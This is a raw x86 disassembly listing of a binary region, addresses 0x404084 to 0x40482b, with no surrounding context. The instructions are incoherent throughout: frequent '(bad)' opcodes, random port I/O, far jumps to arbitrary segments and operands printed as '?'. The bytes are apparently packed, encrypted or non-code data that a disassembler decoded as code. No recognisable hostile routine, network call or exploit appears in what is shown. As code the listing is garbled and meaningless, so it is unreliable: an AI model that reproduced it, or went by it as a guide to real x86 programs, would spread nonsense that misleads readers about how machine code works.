  404084:	add    DWORD PTR [ebx+0x62],eax
  404087:	out    0xb7,al
  404089:	xchg   edx,eax
  40408a:	inc    edx
  40408b:	dec    edx
  40408c:	(bad)  
  40408d:	xor    al,cl
  40408f:	pushf  
  404090:	in     al,0xc9
  404092:	rcl    DWORD PTR [ebx+ecx*8],1
  404095:	scas   eax,DWORD PTR es:[edi]
  404096:	imul   ecx,DWORD PTR [ebx+eiz*2+0x47],0xffffff92
  40409b:	leave  
  40409c:	adc    edx,edi
  40409e:	ss xchg ecx,eax
  4040a0:	fst    QWORD PTR [esi+0x56]
  4040a3:	icebp  
  4040a4:	cmp    BYTE PTR [esi+eax*1+0x43],dh
  4040a8:	jb     0x404085
  4040aa:	daa    
  4040ab:	push   ecx
  4040ac:	idiv   DWORD PTR [edi+0x446b3cc0]
  4040b2:	cmp    al,0xed
  4040b4:	push   cs
  4040b5:	jecxz  0x4040eb
  4040b7:	mov    dh,0xf6
  4040b9:	fcomp  DWORD PTR [eiz*4+0x107b0e8d]
  4040c0:	mov    dh,0xe1
  4040c2:	mov    ah,0x3c
  4040c4:	fsubr  DWORD PTR [edi+0x7f3d940d]
  4040ca:	setne  bl
  4040cd:	xor    BYTE PTR [edi-0x40],dh
  4040d0:	inc    ecx
  4040d1:	mov    ecx,0x7c0cfff5
  4040d6:	or     dl,BYTE PTR [ebx]
  4040d8:	inc    edx
  4040d9:	and    cl,BYTE PTR [edi+0x27]
  4040dc:	daa    
  4040dd:	dec    esi
  4040de:	loope  0x4040d3
  4040e0:	pop    esp
  4040e1:	pop    ds
  4040e2:	stc    
  4040e3:	inc    ebp
  4040e4:	xchg   esp,eax
  4040e5:	call   0x14d1cc9d
  4040ea:	in     eax,dx
  4040eb:	xchg   esp,eax
  4040ec:	repz ss in eax,dx
  4040ef:	iret   
  4040f0:	add    eax,DWORD PTR [edi]
  4040f2:	mov    dh,0x77
  4040f4:	sub    ebx,ebx
  4040f6:	cmp    edx,DWORD PTR [edx-0x67]
  4040f9:	dec    edi
  4040fa:	push   eax
  4040fb:	outs   dx,BYTE PTR ds:[esi]
  4040fc:	leave  
  4040fd:	add    eax,0x5c0543a7
  404102:	int3   
  404103:	xor    eax,0x5da4300d
  404108:	jmp    0x3daf:0xf218887
  40410f:	sbb    ch,BYTE PTR [ebp+0x2f]
  404112:	imul   edx,edx,0xb3bc31ae
  404118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404119:	dec    ebx
  40411a:	(bad)  
  40411b:	dec    esp
  40411c:	data16 arpl WORD PTR [esi+0x2b053812],bp
  404123:	sbb    ah,BYTE PTR [edx-0x57]
  404126:	mov    edx,DWORD PTR [eax]
  404128:	jb     0x404151
  40412a:	bound  ebx,QWORD PTR [ebx-0x80]
  40412d:	add    al,0xb5
  40412f:	jns    0x40412e
  404131:	inc    ebx
  404132:	int    0x34
  404134:	jb     0x4040d5
  404136:	bound  ebx,QWORD PTR [edx-0x9bcf723]
  40413c:	add    eax,0x79462ca2
  404141:	ins    BYTE PTR es:[edi],dx
  404142:	or     al,0x68
  404144:	xchg   DWORD PTR [esp+eax*8],edi
  404147:	mov    ds:0xf8fa52b7,al
  40414c:	and    DWORD PTR [ecx-0x1eea1855],edx
  404152:	retf   0xd485
  404155:	jl     0x4041bc
  404157:	sub    eax,0x731d4afb
  40415c:	rcl    edi,0x1e
  40415f:	push   esp
  404160:	xor    DWORD PTR ds:0xf829bd6,eax
  404166:	jno    0x404173
  404168:	push   edx
  404169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40416a:	in     eax,dx
  40416b:	mov    esp,0xddf56e4
  404170:	aam    0x4a
  404172:	mov    ah,ah
  404174:	rol    BYTE PTR [ebx],1
  404176:	jo     0x404161
  404178:	xchg   edi,eax
  404179:	dec    edi
  40417a:	(bad)  
  40417b:	sub    ax,WORD PTR [ebp-0x58]
  40417f:	pop    esp
  404180:	push   edi
  404181:	stos   DWORD PTR es:[edi],eax
  404182:	dec    edx
  404183:	mov    al,0x41
  404185:	adc    eax,0xcd899ec2
  40418a:	mov    edx,0x4e2ec984
  40418f:	and    DWORD PTR [ecx+eax*2+0x60287257],0x3bf501a6
  40419a:	push   ebx
  40419c:	mov    ecx,0x6ea927f7
  4041a1:	shr    DWORD PTR [esi+0x65],cl
  4041a4:	jae    0x404180
  4041a6:	xchg   edi,eax
  4041a7:	cwde   
  4041a8:	in     eax,dx
  4041a9:	mov    ds:0xf8c3a45f,eax
  4041ae:	xchg   DWORD PTR [edx+0x52],ebp
  4041b1:	es das 
  4041b3:	call   0x758694
  4041b8:	lods   eax,DWORD PTR ds:[esi]
  4041b9:	and    DWORD PTR [edx],ebx
  4041bb:	pop    ss
  4041bc:	mov    esi,0x63eb1fbb
  4041c1:	add    al,0xf1
  4041c3:	out    dx,al
  4041c4:	jae    0x40417c
  4041c6:	cwde   
  4041c7:	xlat   BYTE PTR ds:[ebx]
  4041c8:	push   esp
  4041c9:	xchg   esp,eax
  4041ca:	and    BYTE PTR [esi-0x5af998cd],cl
  4041d0:	ja     0x4041bc
  4041d2:	sbb    eax,eax
  4041d4:	aad    0xcf
  4041d6:	clc    
  4041d7:	sbb    ch,BYTE PTR [ecx-0x1]
  4041da:	cmp    DWORD PTR [ebx+eax*8-0x1ba1dca7],0xffffffc1
  4041e2:	in     al,dx
  4041e3:	xlat   BYTE PTR ds:[ebx]
  4041e4:	loopne 0x404189
  4041e6:	stos   DWORD PTR es:[edi],eax
  4041e7:	loope  0x4041c3
  4041e9:	cmp    DWORD PTR [edi],ebx
  4041eb:	and    al,0xfa
  4041ed:	mov    edi,0x284073a8
  4041f2:	out    0xcc,al
  4041f4:	fcom   QWORD PTR [edi-0xe]
  4041f7:	outs   dx,BYTE PTR ds:[esi]
  4041f8:	push   ecx
  4041f9:	scas   eax,DWORD PTR es:[edi]
  4041fa:	fild   QWORD PTR [eax]
  4041fc:	mov    ah,0xbf
  4041fe:	icebp  
  4041ff:	fcomp  QWORD PTR [ecx-0x36]
  404202:	es cld 
  404204:	adc    BYTE PTR [esp+ebx*1+0x6c8ecec8],dl
  40420b:	xor    edx,DWORD PTR fs:[ebx+0x65]
  40420f:	(bad)  
  404210:	cmc    
  404211:	popa   
  404212:	push   ebp
  404213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404214:	test   al,0x33
  404216:	dec    eax
  404217:	mov    BYTE PTR [ebx+ebx*1],cl
  40421a:	inc    ecx
  40421b:	sbb    DWORD PTR [ecx-0x705e53e],0x9e558fa9
  404225:	xchg   BYTE PTR [esi-0x427d1e8],dh
  40422b:	dec    ebx
  40422c:	loopne 0x4042a1
  40422e:	fs mov ebx,0x8ed2cf92
  404234:	lods   eax,DWORD PTR ds:[esi]
  404235:	adc    DWORD PTR [esi+0x3e],eax
  404238:	mov    al,ds:0x983ac5de
  40423d:	lods   eax,DWORD PTR ds:[esi]
  40423e:	and    DWORD PTR [ecx+eax*4-0x79],edi
  404242:	mov    ecx,?
  404244:	inc    eax
  404245:	in     al,dx
  404246:	sbb    edx,DWORD PTR [ebx-0x65]
  404249:	std    
  40424a:	push   ecx
  40424b:	leave  
  40424c:	(bad)  
  40424d:	pop    ecx
  40424e:	daa    
  40424f:	add    BYTE PTR [eax+eax*4-0x3a],dl
  404253:	jns    0x404246
  404255:	push   eax
  404256:	jb     0x404240
  404258:	inc    esi
  404259:	jne    0x404278
  40425b:	daa    
  40425c:	(bad)  
  40425e:	rol    eax,cl
  404260:	xchg   ebp,eax
  404261:	outs   dx,DWORD PTR ds:[esi]
  404262:	lods   eax,DWORD PTR ds:[esi]
  404263:	cmp    DWORD PTR [edi-0x12],ebx
  404266:	leave  
  404267:	push   es
  404268:	xchg   BYTE PTR [ecx+0x2dd64bde],ah
  40426e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40426f:	cld    
  404270:	sub    ebx,DWORD PTR [esi-0x14]
  404273:	mov    dl,0xb2
  404275:	mov    esp,0xb2f38da1
  40427a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40427c:	inc    eax
  40427d:	or     ch,bh
  40427f:	pop    ebp
  404280:	jl     0x4042ea
  404282:	sub    edx,DWORD PTR [eax-0x6f]
  404285:	cmp    ah,BYTE PTR [ebx]
  404287:	psrlq  mm7,QWORD PTR [ebp-0xf53f09c]
  40428e:	push   cs
  40428f:	jne    0x404306
  404291:	mov    ah,dh
  404293:	es and al,0x21
  404296:	add    eax,0xe58a672
  40429b:	cmp    cl,cl
  40429d:	mov    eax,0x26a813e6
  4042a2:	cld    
  4042a3:	mov    ebx,0xab0ab60a
  4042a8:	sbb    eax,DWORD PTR [edx-0x6f8c9599]
  4042ae:	enter  0x7e42,0xc6
  4042b2:	push   esp
  4042b3:	enter  0x9a03,0x6d
  4042b7:	pop    esp
  4042b8:	dec    ebx
  4042b9:	mov    ds:0xaa8a78f9,al
  4042be:	xlat   BYTE PTR ds:[ebx]
  4042bf:	addr16 jmp 0x4042e6
  4042c2:	mov    dl,0xbf
  4042c4:	addr16 je 0x404265
  4042c7:	sbb    edi,DWORD PTR [ecx-0x49b3637]
  4042cd:	cmp    eax,eax
  4042cf:	mov    al,ds:0x7f9c900e
  4042d4:	in     al,dx
  4042d5:	stos   DWORD PTR es:[edi],eax
  4042d6:	pop    esp
  4042d7:	lds    edi,FWORD PTR [eax+esi*2+0x1fd339eb]
  4042de:	jle    0x40432b
  4042e0:	dec    eax
  4042e1:	sar    BYTE PTR [esi-0x76f5413],0xb5
  4042e8:	mov    ds:0x9f6fac2f,eax
  4042ed:	adc    DWORD PTR [edx+0x62],esp
  4042f0:	adc    eax,0x6db31ec0
  4042f5:	sub    DWORD PTR [ebp-0x76],edx
  4042f8:	out    0xf7,eax
  4042fa:	mov    ch,0x35
  4042fc:	cwde   
  4042fd:	mul    DWORD PTR [edx-0xf1905cc]
  404303:	and    al,dh
  404305:	js     0x4042f5
  404307:	(bad)  
  404309:	cmp    al,0xb
  40430b:	pop    ecx
  40430c:	inc    edi
  40430d:	and    eax,0x3226b448
  404312:	pusha  
  404313:	fimul  DWORD PTR [ebx-0x4d250e43]
  404319:	or     ecx,DWORD PTR [edi+0x4e100a63]
  40431f:	push   0xffffffce
  404321:	jae    0x40437e
  404323:	add    al,0x86
  404325:	xor    esp,DWORD PTR [edx+0x5b]
  404328:	dec    esp
  404329:	mov    ebp,0x6581e022
  40432e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40432f:	mov    cl,0xc1
  404331:	add    esi,edi
  404333:	arpl   cx,ax
  404335:	push   0x10682a49
  40433a:	mov    dl,0xb0
  40433c:	into   
  40433d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40433e:	mov    eax,0xf6ad5083
  404343:	dec    esp
  404344:	dec    ebp
  404345:	inc    ebp
  404346:	in     al,dx
  404347:	scas   eax,DWORD PTR es:[edi]
  404348:	ficom  DWORD PTR [ebx-0x51]
  40434b:	jo     0x4043cb
  40434d:	and    bl,bl
  40434f:	inc    edx
  404350:	imul   BYTE PTR [eax+ebx*4+0x554f2b3b]
  404357:	leave  
  404358:	sbb    bl,BYTE PTR [ecx+eiz*2]
  40435b:	inc    ebp
  40435c:	mov    al,0x7b
  40435e:	or     al,0xe4
  404360:	mov    ch,0xb1
  404362:	scas   eax,DWORD PTR es:[edi]
  404363:	dec    ecx
  404364:	test   al,0x94
  404366:	xor    BYTE PTR [ecx-0x4c],dh
  404369:	and    esp,DWORD PTR [ebp+0x6]
  40436c:	out    0xa6,al
  40436e:	dec    ecx
  40436f:	retf   
  404370:	cmp    eax,0x2351b7bb
  404375:	or     dh,BYTE PTR [ebx-0x5c40baf1]
  40437b:	push   es
  40437c:	call   0xce90:0x49b0ec5
  404383:	mov    eax,ds:0xcb20e1c8
  404388:	fisttp WORD PTR [eax]
  40438a:	xchg   edx,eax
  40438b:	mov    esp,0x60e77c9
  404390:	ins    BYTE PTR es:[edi],dx
  404391:	fcomp  DWORD PTR [edi-0x71]
  404394:	(bad)  
  404396:	inc    ebp
  404397:	xchg   ecx,eax
  404398:	fcom   QWORD PTR [eax]
  40439a:	cdq    
  40439b:	lahf   
  40439c:	push   edx
  40439d:	test   eax,0x91ea74b9
  4043a2:	inc    edx
  4043a3:	sbb    esp,edi
  4043a5:	loope  0x4043aa
  4043a7:	vcmppd ymm0,ymm5,ymm4,0xaa
  4043ac:	jbe    0x404372
  4043ae:	or     DWORD PTR [edi-0x25],edi
  4043b1:	(bad)  
  4043b2:	fimul  DWORD PTR [eax+eax*8-0x4d747dab]
  4043b9:	jb     0x4043a6
  4043bb:	mov    bh,0xc3
  4043bd:	data16 int3 
  4043bf:	adc    ebx,ebx
  4043c1:	fiadd  WORD PTR [esi+0x12322644]
  4043c7:	jne    0x404376
  4043c9:	dec    ebp
  4043ca:	mov    ds:0xf523d22c,eax
  4043cf:	scas   al,BYTE PTR es:[edi]
  4043d0:	fidiv  DWORD PTR [esi+0x5a1f58d8]
  4043d6:	ins    DWORD PTR es:[edi],dx
  4043d7:	or     eax,0x5bc60ebc
  4043dc:	lea    edx,[ecx]
  4043de:	mov    eax,0x95df1b6e
  4043e3:	pop    ecx
  4043e4:	lods   eax,DWORD PTR ds:[esi]
  4043e5:	fild   DWORD PTR [esi+0x65]
  4043e8:	push   cs
  4043e9:	daa    
  4043ea:	call   0x91c1:0x55d88cce
  4043f1:	dec    ecx
  4043f2:	xchg   BYTE PTR [esp+edx*2-0x43bf7b6e],bl
  4043f9:	ja     0x40441a
  4043fb:	sub    eax,DWORD PTR ds:0x869a7e2d
  404401:	pop    esi
  404402:	xchg   ebx,eax
  404403:	mov    es:0x3a463dc5,eax
  404409:	pop    edi
  40440a:	or     eax,0x1a2552d0
  40440f:	(bad)  
  404410:	ret    
  404411:	ret    0x9d0a
  404414:	inc    esp
  404415:	cmp    al,0xd2
  404417:	pusha  
  404418:	or     ch,dh
  40441a:	lds    esp,FWORD PTR [eax]
  40441c:	cmp    BYTE PTR [edi+0x4d],bl
  40441f:	sahf   
  404420:	mov    eax,0xf88231d1
  404425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404426:	push   ds
  404427:	adc    al,0x6b
  404429:	push   ecx
  40442a:	pop    es
  40442b:	aam    0x64
  40442d:	push   ss
  40442e:	or     BYTE PTR ds:0x18fa7e25,bl
  404434:	mov    edx,0x50512a89
  404439:	mov    ebp,0xf807ee7a
  40443e:	cmp    eax,0x2
  404441:	mov    cl,0x2c
  404443:	(bad)  
  404445:	sar    dh,cl
  404447:	dec    esp
  404448:	call   0x2fad6002
  40444d:	push   edx
  40444e:	mov    DWORD PTR [edi+edx*4],ebp
  404451:	xchg   edi,eax
  404452:	dec    ebp
  404453:	mov    esp,0xb05e7a42
  404458:	dec    ebp
  404459:	dec    DWORD PTR [ebp+esi*8-0x38]
  40445d:	mov    BYTE PTR [ecx],al
  40445f:	adc    ebp,DWORD PTR [ebp-0x1e2e9932]
  404465:	dec    eax
  404466:	adc    eax,0x6cbdb409
  40446b:	cmp    eax,0x57a902f0
  404470:	add    bl,bl
  404472:	cs aas 
  404474:	lock cmp cl,BYTE PTR [esi]
  404477:	cmp    al,0xb2
  404479:	popa   
  40447a:	fcom   st(3)
  40447c:	xchg   DWORD PTR [eax],ebx
  40447e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40447f:	or     ecx,DWORD PTR [ebx-0x20]
  404482:	mov    cl,0xcf
  404484:	mov    ss,WORD PTR [esi]
  404486:	test   DWORD PTR [edx+ecx*8+0x6f319f47],esp
  40448d:	cli    
  40448e:	xchg   ebp,eax
  40448f:	xor    al,0x4c
  404491:	jne    0x404429
  404493:	imul   eax,DWORD PTR [ebx+0x6bb43ddd],0x1f562d77
  40449d:	ss add dh,ah
  4044a0:	pop    ds
  4044a1:	push   ebx
  4044a2:	jae    0x404475
  4044a4:	xchg   esi,eax
  4044a5:	in     al,0x88
  4044a7:	pop    ds
  4044a8:	outs   dx,DWORD PTR ds:[esi]
  4044a9:	sbb    BYTE PTR [ebp+0x604d699],bh
  4044af:	dec    ecx
  4044b0:	mov    eax,ds:0xf22478d8
  4044b5:	cmp    cl,BYTE PTR [ecx-0x3f]
  4044b8:	sahf   
  4044b9:	pop    esp
  4044ba:	xor    edx,DWORD PTR [edi-0x3639ded3]
  4044c0:	ja     0x40445a
  4044c2:	ret    0x43a9
  4044c5:	pop    ds
  4044c6:	stos   BYTE PTR es:[edi],al
  4044c7:	aaa    
  4044c8:	fcomi  st,st(3)
  4044ca:	pop    ebp
  4044cb:	dec    ebp
  4044cc:	adc    DWORD PTR [ecx-0x26091b8b],ecx
  4044d2:	ins    BYTE PTR es:[edi],dx
  4044d3:	loope  0x404506
  4044d5:	hlt    
  4044d6:	jns    0x4044e1
  4044d8:	sbb    ebp,DWORD PTR [ebp+0x3c358d08]
  4044de:	inc    ecx
  4044df:	inc    eax
  4044e0:	pushf  
  4044e1:	mov    al,ds:0xfe455e25
  4044e6:	lods   eax,DWORD PTR ds:[esi]
  4044e7:	js     0x404511
  4044e9:	je     0x40447f
  4044eb:	xchg   ecx,eax
  4044ec:	add    BYTE PTR [ecx+edx*4],bl
  4044ef:	imul   ebp,DWORD PTR [esi+ebx*1],0x8a00e1e7
  4044f6:	icebp  
  4044f7:	and    eax,0x6f8db7cc
  4044fc:	push   edx
  4044fd:	jno    0x404541
  4044ff:	xor    dl,BYTE PTR [ecx+eiz*1+0x45]
  404503:	ja     0x404549
  404505:	dec    edx
  404506:	mov    dh,BYTE PTR [ebx-0x6f]
  404509:	into   
  40450a:	popf   
  40450b:	es cmp cl,ah
  40450e:	sub    eax,0x38470a9d
  404513:	jno    0x4044d5
  404515:	jmp    0x40450d
  404517:	js     0x4044e6
  404519:	icebp  
  40451a:	jecxz  0x4044bf
  40451c:	pop    esi
  40451d:	pop    esp
  40451e:	shl    DWORD PTR [ecx-0x6e90a590],cl
  404524:	daa    
  404525:	neg    DWORD PTR [edx]
  404527:	inc    DWORD PTR [esi+eiz*1-0x47]
  40452b:	xchg   edx,eax
  40452c:	push   ecx
  40452d:	mov    bh,0xd3
  40452f:	repz (bad) 
  404531:	jo     0x404545
  404533:	ins    BYTE PTR es:[edi],dx
  404534:	je     0x404578
  404536:	mov    edi,0x2cfb9d9e
  40453b:	xor    ebx,DWORD PTR [eax]
  40453d:	mov    eax,ds:0x6c92a631
  404542:	cmp    al,0x81
  404544:	jb     0x4044ce
  404546:	in     eax,0x33
  404548:	pop    edi
  404549:	cwde   
  40454a:	mov    es,esi
  40454c:	mov    al,BYTE PTR [eax*4+0x7dcb9ca7]
  404553:	sbb    al,0x79
  404555:	aad    0x33
  404557:	xor    eax,0x57ea838b
  40455c:	retf   0x4792
  40455f:	jbe    0x4045aa
  404561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404562:	push   edx
  404563:	sahf   
  404564:	xor    al,0x73
  404566:	(bad)  
  404567:	jb     0x40457c
  404569:	jmp    0x404591
  40456b:	lds    ecx,FWORD PTR [edi-0x3]
  40456e:	jnp    0x4045bd
  404570:	push   ecx
  404571:	lods   eax,DWORD PTR ds:[esi]
  404572:	inc    edi
  404573:	(bad)  
  404574:	dec    ecx
  404575:	ins    DWORD PTR es:[edi],dx
  404576:	mov    edx,fs
  404578:	ins    BYTE PTR es:[edi],dx
  404579:	xchg   BYTE PTR [eax-0xd80681f],ch
  40457f:	mov    BYTE PTR [edi],bl
  404581:	inc    edx
  404582:	inc    ecx
  404583:	hlt    
  404584:	das    
  404585:	js     0x40451a
  404587:	shl    esp,cl
  404589:	sahf   
  40458a:	mov    ah,0xf3
  40458d:	dec    edx
  40458e:	(bad)  
  40458f:	and    eax,0x535f1eca
  404594:	stc    
  404595:	int    0xec
  404597:	mov    bh,0x8d
  404599:	push   edi
  40459a:	and    al,0xca
  40459c:	and    ebx,esi
  40459e:	pop    es
  40459f:	or     ebp,DWORD PTR [ebx]
  4045a1:	sbb    BYTE PTR ds:0xdcb3af5b,ch
  4045a7:	cmp    BYTE PTR fs:[eax+0x6],0x9c
  4045ac:	and    eax,0xbc01a9a8
  4045b1:	dec    ebx
  4045b2:	jge    0x404566
  4045b4:	xchg   edx,eax
  4045b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b6:	into   
  4045b7:	ins    BYTE PTR es:[edi],dx
  4045b8:	retf   0xbfcd
  4045bb:	adc    eax,0xd1336c80
  4045c0:	add    al,0xd7
  4045c2:	or     dh,bl
  4045c4:	lds    esp,FWORD PTR [eax]
  4045c6:	inc    edx
  4045c7:	xor    esp,esi
  4045c9:	cli    
  4045ca:	mov    cl,0xf5
  4045cc:	(bad)  
  4045cd:	shl    cl,1
  4045cf:	retf   
  4045d0:	jmp    0x6dc8d078
  4045d5:	push   cs
  4045d6:	jne    0x4045c1
  4045d8:	mul    DWORD PTR [ebx-0x6]
  4045db:	pop    ecx
  4045dc:	add    al,0xdb
  4045de:	push   esi
  4045df:	or     eax,0x89c10436
  4045e4:	pop    ss
  4045e5:	mov    esp,ecx
  4045e7:	cmp    eax,0x991b8ae2
  4045ec:	nop
  4045ed:	pop    ds
  4045ee:	or     edx,DWORD PTR [edx-0x27]
  4045f1:	xor    bh,BYTE PTR [edx-0x4d3326]
  4045f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045f8:	pusha  
  4045f9:	jmp    0x40461b
  4045fb:	inc    ecx
  4045fc:	(bad)  
  4045fd:	xchg   ah,cl
  4045ff:	mov    ebp,0xf77a3ccb
  404604:	es loope 0x404641
  404607:	mov    DWORD PTR [ebx+0x5a],eax
  40460a:	jmp    0xd3df0ed5
  40460f:	(bad)  
  404610:	jno    0x4045ec
  404612:	int3   
  404613:	mov    esi,?
  404615:	mov    edi,0x75e46dc7
  40461a:	rcr    esp,0xb8
  40461d:	inc    cl
  40461f:	cli    
  404620:	dec    ebp
  404621:	dec    eax
  404622:	aad    0xd6
  404624:	push   ecx
  404625:	aas    
  404626:	mov    BYTE PTR [ebx+0x31],bh
  404629:	xchg   ecx,eax
  40462a:	sub    edx,DWORD PTR [edi]
  40462c:	fnsave [eax-0x5c8eeb11]
  404632:	add    eax,0xae7054bd
  404637:	sbb    eax,0x86ea7e47
  40463c:	xlat   BYTE PTR ds:[ebx]
  40463d:	mov    al,0x20
  40463f:	call   0x49be:0xa1b26d99
  404646:	jmp    FWORD PTR [esi]
  404648:	aam    0xfe
  40464a:	xor    DWORD PTR [edi],0x3b6793db
  404650:	xchg   esi,eax
  404651:	jmp    0x8639:0xb93d69f4
  404658:	daa    
  404659:	mov    BYTE PTR [esi-0xc95d350],cl
  40465f:	je     0x4045e6
  404661:	mov    ecx,0x4f4e2069
  404666:	fsub   DWORD PTR [ecx]
  404668:	clc    
  404669:	ss xchg ebp,eax
  40466b:	repz adc edx,ecx
  40466e:	ja     0x4045fd
  404670:	test   al,0xa4
  404672:	scas   al,BYTE PTR es:[edi]
  404673:	pop    edx
  404674:	mov    ds,WORD PTR [esi+0x582b47d0]
  40467a:	int3   
  40467b:	sahf   
  40467c:	and    ax,0x3
  404680:	inc    eax
  404681:	nop
  404682:	(bad)  
  404683:	mov    ds:0x1847c4ee,al
  404688:	jmp    0x4046d8
  40468a:	inc    edi
  40468b:	sbb    edx,eax
  40468d:	xchg   esp,eax
  40468e:	xchg   DWORD PTR [eax],ecx
  404690:	div    ch
  404692:	out    dx,eax
  404693:	adc    eax,0xb124e4cd
  404698:	xchg   esp,eax
  404699:	setb   BYTE PTR [esi-0x76]
  40469d:	adc    al,bh
  40469f:	daa    
  4046a0:	cmovo  ebp,DWORD PTR [eax+0x2325543e]
  4046a7:	ds scas al,BYTE PTR es:[edi]
  4046a9:	jnp    0x404679
  4046ab:	jmp    0x85605ce9
  4046b0:	mov    edi,0x42a613bd
  4046b5:	dec    ebx
  4046b6:	inc    esp
  4046b7:	loope  0x40467a
  4046b9:	test   al,0x4c
  4046bb:	pusha  
  4046bc:	adc    ebx,eax
  4046be:	(bad)  
  4046bf:	int3   
  4046c0:	push   0xafb641fc
  4046c5:	aam    0x2c
  4046c7:	lds    edx,FWORD PTR ds:[ecx-0x16551fb8]
  4046ce:	je     0x4046a3
  4046d0:	and    al,0xea
  4046d2:	sub    bh,BYTE PTR [ecx+0x75]
  4046d5:	cmc    
  4046d6:	(bad)  
  4046d7:	lods   eax,DWORD PTR ds:[esi]
  4046d8:	or     dl,bl
  4046da:	add    DWORD PTR [edi+0x70fdc90],ecx
  4046e0:	ins    BYTE PTR es:[edi],dx
  4046e1:	fcomp  QWORD PTR [esi]
  4046e3:	adc    DWORD PTR [edi-0x73b32b76],ecx
  4046e9:	mov    ah,0xf0
  4046eb:	pop    eax
  4046ec:	imul   ecx,DWORD PTR [esi+edi*1-0x1595b703],0xffffffa7
  4046f4:	icebp  
  4046f5:	sahf   
  4046f6:	push   edx
  4046f7:	or     DWORD PTR [ebx+edx*1],0x1
  4046fb:	leave  
  4046fc:	adc    esi,DWORD PTR [ebp+0x48]
  4046ff:	adc    eax,0xbd9ed5b2
  404704:	aas    
  404705:	into   
  404706:	cmc    
  404707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404708:	aaa    
  404709:	outs   dx,BYTE PTR ds:[esi]
  40470a:	movhps xmm7,QWORD PTR [edi-0x53]
  40470e:	retf   0x253
  404711:	fisttp WORD PTR [eax+ebx*2-0x70141551]
  404718:	out    0xc4,eax
  40471a:	or     eax,0x354dfcf2
  40471f:	(bad)  
  404720:	xchg   ebx,eax
  404721:	fsub   st(3),st
  404723:	mov    eax,ds:0xcd9fea49
  404728:	jbe    0x404704
  40472a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40472b:	(bad)  
  40472c:	dec    edi
  40472d:	(bad)  
  40472e:	setp   BYTE PTR [ecx+0x56b6bd3c]
  404735:	and    edx,eax
  404737:	sub    DWORD PTR [esi+0xe],edx
  40473a:	cli    
  40473b:	outs   dx,DWORD PTR ds:[esi]
  40473c:	(bad)  
  40473d:	jmp    0x404717
  40473f:	mov    BYTE PTR [edx+edx*4+0xbea50c],ah
  404746:	pusha  
  404747:	or     BYTE PTR [eax],0x9c
  40474a:	add    edx,eax
  40474c:	in     eax,dx
  40474d:	adc    BYTE PTR [esi],dl
  40474f:	sub    esi,DWORD PTR [eax]
  404751:	push   ss
  404752:	inc    eax
  404753:	in     al,dx
  404754:	repnz ins BYTE PTR es:[edi],dx
  404756:	popf   
  404757:	test   ecx,ebx
  404759:	sbb    BYTE PTR [edx],0x8f
  40475c:	xchg   ebp,eax
  40475d:	xchg   ebp,edx
  40475f:	repnz dec ax
  404762:	outs   dx,DWORD PTR ds:[esi]
  404763:	xor    ebp,ebp
  404765:	cmp    DWORD PTR [ecx+0x5f],0xa53c8fc5
  40476c:	repnz adc DWORD PTR [ebx-0x4e],eax
  404770:	mov    bl,0x6d
  404772:	std    
  404773:	inc    ebx
  404774:	and    ch,BYTE PTR [ecx-0x15]
  404777:	lea    eax,[edx+0x70]
  40477a:	xor    BYTE PTR [esi],cl
  40477c:	adc    bl,BYTE PTR [ecx]
  40477e:	adc    ecx,eax
  404780:	mov    ds:0xab1b16fb,al
  404785:	or     al,0xe0
  404787:	xbegin 0x81cc34b7
  40478d:	mov    bl,0xad
  40478f:	adc    BYTE PTR [esp+edx*1+0x317f7211],dh
  404796:	xchg   esi,eax
  404797:	int    0xea
  404799:	das    
  40479a:	jmp    0xd890:0x58c5424f
  4047a1:	mov    ch,0x67
  4047a3:	outs   dx,BYTE PTR ds:[esi]
  4047a4:	(bad)  
  4047a5:	pop    esi
  4047a6:	pop    es
  4047a7:	mov    DWORD PTR [ecx],eax
  4047a9:	mov    WORD PTR [ebx],cs
  4047ab:	cli    
  4047ac:	leave  
  4047ad:	add    eax,ecx
  4047af:	loop   0x4047bf
  4047b1:	cs inc ebp
  4047b3:	(bad)  
  4047b5:	push   edi
  4047b6:	fnsave [esi+0x19]
  4047b9:	mov    ds:0xfcab19bd,eax
  4047be:	mov    WORD PTR [ebp+edi*4-0x34a2de98],es
  4047c5:	push   ecx
  4047c6:	in     al,dx
  4047c7:	stos   BYTE PTR es:[edi],al
  4047c8:	ss mov al,0x4b
  4047cb:	mov    esi,0x4984ce53
  4047d0:	push   ss
  4047d1:	add    DWORD PTR [ebx],0x78
  4047d4:	ss icebp 
  4047d6:	cmp    edi,DWORD PTR [ecx]
  4047d8:	jp     0x4047c5
  4047da:	push   edx
  4047db:	jp     0x404823
  4047dd:	test   eax,0x6e555e70
  4047e2:	arpl   WORD PTR [eax+0x66],sp
  4047e5:	mov    ah,0x6c
  4047e7:	sbb    BYTE PTR [ebx],0xcf
  4047ea:	jns    0x4047e5
  4047ec:	mov    ebp,0xc3f0c116
  4047f1:	clc    
  4047f2:	popaw  
  4047f4:	popf   
  4047f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047f6:	lods   al,BYTE PTR ds:[esi]
  4047f7:	pop    ecx
  4047f8:	fwait
  4047f9:	xchg   ecx,eax
  4047fa:	push   ebx
  4047fb:	stos   DWORD PTR es:[edi],eax
  4047fc:	adc    eax,0x7a13389a
  404801:	mov    ecx,0xcf47812e
  404806:	ret    0x48da
  404809:	and    al,0xbd
  40480b:	adc    ch,al
  40480d:	inc    edx
  40480e:	mov    ds:0x2d95879,al
  404813:	dec    ebx
  404814:	dec    ecx
  404815:	mov    esp,0x2a6c5441
  40481a:	sbb    ecx,ecx
  40481c:	add    BYTE PTR [ebx-0xf19a333],0x2f
  404823:	ja     0x404871
  404825:	das    
  404826:	mov    edi,0xa2769c66
  40482b:	mov    WORD PTR [edx-0x6f],?
